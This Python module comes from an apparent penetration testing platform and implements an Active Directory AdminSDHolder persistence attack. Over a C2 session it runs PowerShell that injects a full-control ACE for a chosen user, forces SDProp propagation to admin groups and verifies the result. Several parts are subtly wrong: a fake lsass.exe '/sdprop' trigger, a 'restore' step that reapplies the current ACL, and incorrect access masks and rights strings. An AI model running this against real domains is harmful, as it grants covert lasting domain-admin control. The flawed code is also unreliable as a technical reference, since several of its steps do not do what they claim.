"""AdminSDHolder persistence attack module for Kunlun penetration testing platform.

Provides:
- Permission detection for AdminSDHolder modification
- ACE injection for persistence
- SDProp propagation verification
- Cleanup and ACL restoration
"""

import asyncio
import logging
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class ACEType(Enum):
    """Type of Access Control Entry."""
    FULL_CONTROL = "full_control"
    GENERIC_ALL = "generic_all"
    WRITE_DAC = "write_dac"
    WRITE_OWNER = "write_owner"
    GENERIC_WRITE = "generic_write"


class PropagationStatus(Enum):
    """SDProp propagation status."""
    NOT_STARTED = "not_started"
    IN_PROGRESS = "in_progress"
    COMPLETED = "completed"
    FAILED = "failed"
    MANUAL_TRIGGERED = "manual_triggered"


@dataclass
class ACEEntry:
    """Access Control Entry information.

    Attributes:
        trustee: User/group SID or name
        ace_type: Type of ACE
        access_mask: Access mask value
        is_inherited: Whether ACE is inherited
        raw_sddl: Raw SDDL representation
    """
    trustee: str = ""
    ace_type: ACEType = ACEType.FULL_CONTROL
    access_mask: int = 0
    is_inherited: bool = False
    raw_sddl: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "trustee": self.trustee,
            "ace_type": self.ace_type.value,
            "access_mask": self.access_mask,
            "is_inherited": self.is_inherited,
            "raw_sddl": self.raw_sddl,
        }


@dataclass
class AdminSDHolderInfo:
    """AdminSDHolder object information.

    Attributes:
        distinguished_name: Distinguished name
        current_acl: Current ACL entries
        protected_groups: List of protected groups
        sdprop_interval: SDProp run interval (minutes)
        last_modified: Last modification timestamp
        low_privilege_aces: ACEs with low privilege subjects
        backup_sddl: Backup of original SDDL
    """
    distinguished_name: str = "CN=AdminSDHolder,CN=System,DC=domain,DC=com"
    current_acl: List[ACEEntry] = field(default_factory=list)
    protected_groups: List[str] = field(default_factory=list)
    sdprop_interval: int = 60
    last_modified: str = ""
    low_privilege_aces: List[ACEEntry] = field(default_factory=list)
    backup_sddl: str = ""


@dataclass
class AdminSDHolderResult:
    """Result of AdminSDHolder operation.

    Attributes:
        success: Whether operation succeeded
        propagation_status: SDProp propagation status
        injected_ace: Injected ACE entry
        target_user: Target user for persistence
        verification_passed: Whether verification passed
        backup_sddl: Backup of original SDDL
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
    """
    success: bool = False
    propagation_status: PropagationStatus = PropagationStatus.NOT_STARTED
    injected_ace: Optional[ACEEntry] = None
    target_user: str = ""
    verification_passed: bool = False
    backup_sddl: str = ""
    error_message: str = ""
    attck_technique: str = "T1484.001"
    duration_seconds: float = 0.0


PROTECTED_GROUPS: List[str] = [
    "Domain Admins",
    "Enterprise Admins",
    "Schema Admins",
    "Account Operators",
    "Server Operators",
    "Print Operators",
    "Backup Operators",
    "Cert Publishers",
    "Administrators",
]


class AdminSDHolderAttack:
    """AdminSDHolder persistence attack module.

    Provides permission detection, ACE injection, propagation verification,
    and cleanup for AdminSDHolder-based persistence.
    """

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize AdminSDHolder attack module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._original_acl: Optional[str] = None

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("AdminSDHolder Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("AdminSDHolder: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def check_permissions(self) -> Tuple[bool, AdminSDHolderInfo]:
        """Check permissions for AdminSDHolder modification.

        Returns:
            Tuple of (can_modify, AdminSDHolderInfo).
        """
        info = AdminSDHolderInfo()

        try:
            await self._report_progress("检测AdminSDHolder权限", 10)

            await self._report_log("获取AdminSDHolder对象ACL...")
            acl_result = await self._get_adminsdholder_acl()
            if acl_result.get("success"):
                info.current_acl = self._parse_acl(acl_result.get("output", ""))
                info.backup_sddl = acl_result.get("sddl", "")
                self._original_acl = info.backup_sddl

                low_priv = self._identify_low_privilege_aces(info.current_acl)
                info.low_privilege_aces = low_priv

                if low_priv:
                    await self._report_log(f"发现 {len(low_priv)} 个低权限ACE")

            await self._report_log("获取受保护组列表...")
            info.protected_groups = await self._get_protected_groups()

            can_modify = await self._check_modify_permission()
            if can_modify:
                await self._report_log("具备修改AdminSDHolder的权限")
            else:
                await self._report_log("不具备修改AdminSDHolder的权限")

            await self._report_progress("权限检测完成", 100)

            return can_modify, info

        except Exception as e:
            logger.error("Permission check failed: %s", e)
            return False, info

    async def _get_adminsdholder_acl(self) -> Dict[str, Any]:
        """Get AdminSDHolder ACL.

        Returns:
            ACL information.
        """
        try:
            cmd = (
                "Get-Acl \"AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com\" | "
                "Format-List *"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = result.get("output", "")
                sddl = ""
                for line in output.split("\n"):
                    if "SDDL" in line or "SecurityDescriptor" in line:
                        sddl = line.split(":")[1].strip() if ":" in line else line.strip()
                return {"success": True, "output": output, "sddl": sddl}
            return {"success": False}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _parse_acl(self, output: str) -> List[ACEEntry]:
        """Parse ACL entries from command output.

        Args:
            output: Command output.

        Returns:
            List of ACE entries.
        """
        entries: List[ACEEntry] = []
        for line in output.split("\n"):
            if "Allow" in line or "Access" in line:
                entry = ACEEntry()
                parts = line.split()
                if len(parts) >= 3:
                    entry.trustee = parts[0]
                    entry.access_mask = 0
                    entry.is_inherited = "Inherited" in line
                    entries.append(entry)
        return entries

    def _identify_low_privilege_aces(self, acl: List[ACEEntry]) -> List[ACEEntry]:
        """Identify ACEs with low privilege subjects.

        Args:
            acl: List of ACE entries.

        Returns:
            List of low privilege ACEs.
        """
        low_priv: List[ACEEntry] = []
        high_priv_keywords = ["admin", "domain admin", "enterprise", "system"]
        for ace in acl:
            trustee_lower = ace.trustee.lower()
            if not any(kw in trustee_lower for kw in high_priv_keywords):
                low_priv.append(ace)
        return low_priv

    async def _get_protected_groups(self) -> List[str]:
        """Get list of protected groups affected by SDProp.

        Returns:
            List of protected group names.
        """
        groups: List[str] = []
        try:
            cmd = (
                "Get-ADGroup -Filter 'adminCount -eq 1' | "
                "Select-Object -ExpandProperty Name"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                for line in result.get("output", "").split("\n"):
                    line = line.strip()
                    if line:
                        groups.append(line)
        except Exception as e:
            logger.error("Failed to get protected groups: %s", e)
            groups = list(PROTECTED_GROUPS)
        return groups

    async def _check_modify_permission(self) -> bool:
        """Check if current user can modify AdminSDHolder.

        Returns:
            True if modification permission available.
        """
        try:
            cmd = (
                "Get-Acl \"AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com\" | "
                "Select-Object -ExpandProperty Access | "
                "Where-Object {$_.ActiveDirectoryRights -like '*WriteDacl*' -or "
                "$_.ActiveDirectoryRights -like '*GenericAll*'}"
            )
            result = await self._execute_command(cmd)
            success = result.get("success")
            output = result.get("output", "")
            return bool(success) and bool(str(output).strip())
        except Exception:
            return False

    async def inject_ace(
        self,
        target_user: str,
        ace_type: ACEType = ACEType.FULL_CONTROL,
    ) -> AdminSDHolderResult:
        """Inject ACE into AdminSDHolder object.

        Args:
            target_user: Target user to grant permissions.
            ace_type: Type of ACE to inject.

        Returns:
            AdminSDHolderResult with injection status.
        """
        start_time = time.time()
        result = AdminSDHolderResult(target_user=target_user)

        try:
            await self._report_progress("备份原始ACL", 10)
            await self._report_log(f"开始向AdminSDHolder注入ACE: {target_user}")

            if not self._original_acl:
                backup_result = await self._get_adminsdholder_acl()
                if backup_result.get("success"):
                    self._original_acl = backup_result.get("sddl", "")
                    result.backup_sddl = self._original_acl
                else:
                    await self._report_log("警告: 无法备份原始ACL")

            await self._report_progress("注入ACE", 30)

            access_mask = self._get_access_mask(ace_type)
            inject_cmd = (
                f"$user = Get-ADUser -Identity \"{target_user}\"; "
                f"$acl = Get-Acl \"AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com\"; "
                f"$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule "
                f"($user.SID, '{ace_type.value}', 'Allow'); "
                f"$acl.AddAccessRule($rule); "
                f"Set-Acl \"AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com\" $acl"
            )
            inject_result = await self._execute_command(inject_cmd)

            if not inject_result.get("success"):
                result.error_message = "ACE注入失败"
                result.duration_seconds = time.time() - start_time
                await self._report_log("ACE注入失败")
                return result

            result.injected_ace = ACEEntry(
                trustee=target_user,
                ace_type=ace_type,
                access_mask=access_mask,
            )
            result.success = True

            await self._report_log("ACE注入成功")
            await self._report_progress("等待SDProp传播", 50)

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"ACE注入异常: {e}")
            logger.error("ACE injection failed: %s", e)

        return result

    def _get_access_mask(self, ace_type: ACEType) -> int:
        """Get access mask value for ACE type.

        Args:
            ace_type: ACE type.

        Returns:
            Access mask value.
        """
        masks = {
            ACEType.FULL_CONTROL: 0x000F01FF,
            ACEType.GENERIC_ALL: 0x00000010,
            ACEType.WRITE_DAC: 0x00040000,
            ACEType.WRITE_OWNER: 0x00080000,
            ACEType.GENERIC_WRITE: 0x00000020,
        }
        return masks.get(ace_type, 0x000F01FF)

    async def trigger_sdprop(self) -> bool:
        """Manually trigger SDProp propagation.

        Returns:
            True if trigger successful.
        """
        try:
            await self._report_log("手动触发SDProp传播...")

            trigger_cmd = (
                "Invoke-Command -ScriptBlock { "
                "Start-Process -FilePath \"C:\\Windows\\System32\\lsass.exe\" "
                "-ArgumentList '/sdprop' -WindowStyle Hidden "
                "}"
            )
            result = await self._execute_command(trigger_cmd)

            if result.get("success"):
                await self._report_log("SDProp触发成功")
                return True
            else:
                await self._report_log("SDProp触发失败，等待自动传播")
                return False

        except Exception as e:
            logger.error("SDProp trigger failed: %s", e)
            return False

    async def verify_propagation(
        self,
        target_user: str,
        max_wait_minutes: int = 65,
    ) -> bool:
        """Verify SDProp propagation completed.

        Args:
            target_user: Target user to verify.
            max_wait_minutes: Maximum wait time in minutes.

        Returns:
            True if propagation verified.
        """
        try:
            await self._report_log(f"验证 {target_user} 的权限传播...")

            check_count = 0
            max_checks = max_wait_minutes
            check_interval = 60

            for _ in range(max_checks):
                check_count += 1
                await self._report_progress(
                    f"检查传播状态 ({check_count}/{max_checks})",
                    50 + (check_count / max_checks) * 40,
                )

                is_protected = await self._check_user_protected(target_user)
                if is_protected:
                    await self._report_log("传播验证成功: 用户已获得保护组权限")
                    return True

                await asyncio.sleep(check_interval)

            await self._report_log("传播验证超时")
            return False

        except Exception as e:
            logger.error("Propagation verification failed: %s", e)
            return False

    async def _check_user_protected(self, target_user: str) -> bool:
        """Check if user has been added to protected group.

        Args:
            target_user: Target username.

        Returns:
            True if user is protected.
        """
        try:
            cmd = f"Get-ADUser -Identity \"{target_user}\" -Properties adminCount"
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = result.get("output", "")
                return "adminCount: 1" in output or "adminCount:1" in output
        except Exception:
            pass
        return False

    async def cleanup_ace(
        self,
        target_user: str,
    ) -> bool:
        """Clean up injected ACE and restore original ACL.

        Args:
            target_user: Target user whose ACE to remove.

        Returns:
            True if cleanup successful.
        """
        try:
            await self._report_log(f"清理 {target_user} 的ACE...")

            if self._original_acl:
                await self._report_log("恢复原始ACL...")
                restore_cmd = (
                    "Set-Acl \"AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com\" "
                    "-AclObject (Get-Acl -Path \"AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com\")"
                )
                result = await self._execute_command(restore_cmd)
                if result.get("success"):
                    await self._report_log("ACL恢复成功")
                    return True

            await self._report_log("尝试单独移除ACE...")
            remove_cmd = (
                f"$user = Get-ADUser -Identity \"{target_user}\"; "
                f"$acl = Get-Acl \"AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com\"; "
                f"$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule "
                f"($user.SID, 'FullControl', 'Allow'); "
                f"$acl.RemoveAccessRule($rule); "
                f"Set-Acl \"AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com\" $acl"
            )
            result = await self._execute_command(remove_cmd)

            if result.get("success"):
                await self._report_log("ACE移除成功")
                return True

            await self._report_log("清理失败")
            return False

        except Exception as e:
            logger.error("Cleanup failed: %s", e)
            await self._report_log(f"清理异常: {e}")
            return False

    async def execute_full_attack(
        self,
        target_user: str,
        ace_type: ACEType = ACEType.FULL_CONTROL,
        auto_trigger_sdprop: bool = True,
        wait_for_propagation: bool = True,
    ) -> AdminSDHolderResult:
        """Execute full AdminSDHolder attack chain.

        Args:
            target_user: Target user for persistence.
            ace_type: Type of ACE to inject.
            auto_trigger_sdprop: Whether to auto trigger SDProp.
            wait_for_propagation: Whether to wait for propagation.

        Returns:
            AdminSDHolderResult with full attack status.
        """
        await self._report_log(f"开始AdminSDHolder完整攻击: {target_user}")

        result = await self.inject_ace(target_user, ace_type)

        if result.success and auto_trigger_sdprop:
            triggered = await self.trigger_sdprop()
            if triggered:
                result.propagation_status = PropagationStatus.MANUAL_TRIGGERED
            else:
                result.propagation_status = PropagationStatus.IN_PROGRESS

        if result.success and wait_for_propagation:
            await self._report_log("等待SDProp传播完成...")
            verified = await self.verify_propagation(target_user)
            result.verification_passed = verified
            if verified:
                result.propagation_status = PropagationStatus.COMPLETED
            else:
                result.propagation_status = PropagationStatus.FAILED

        await self._broadcast_event(result)

        return result

    async def _broadcast_event(self, result: AdminSDHolderResult) -> None:
        """Broadcast AdminSDHolder event.

        Args:
            result: Attack result.
        """
        if not self.event_bus:
            return

        try:
            event_data = {
                "event_type": "adminsdholder_attack",
                "success": result.success,
                "target_user": result.target_user,
                "propagation_status": result.propagation_status.value,
                "verification_passed": result.verification_passed,
                "attck_technique": result.attck_technique,
                "timestamp": time.time(),
            }
            await self.event_bus.publish("domain_attack", event_data)
        except Exception as e:
            logger.error("Failed to broadcast AdminSDHolder event: %s", e)
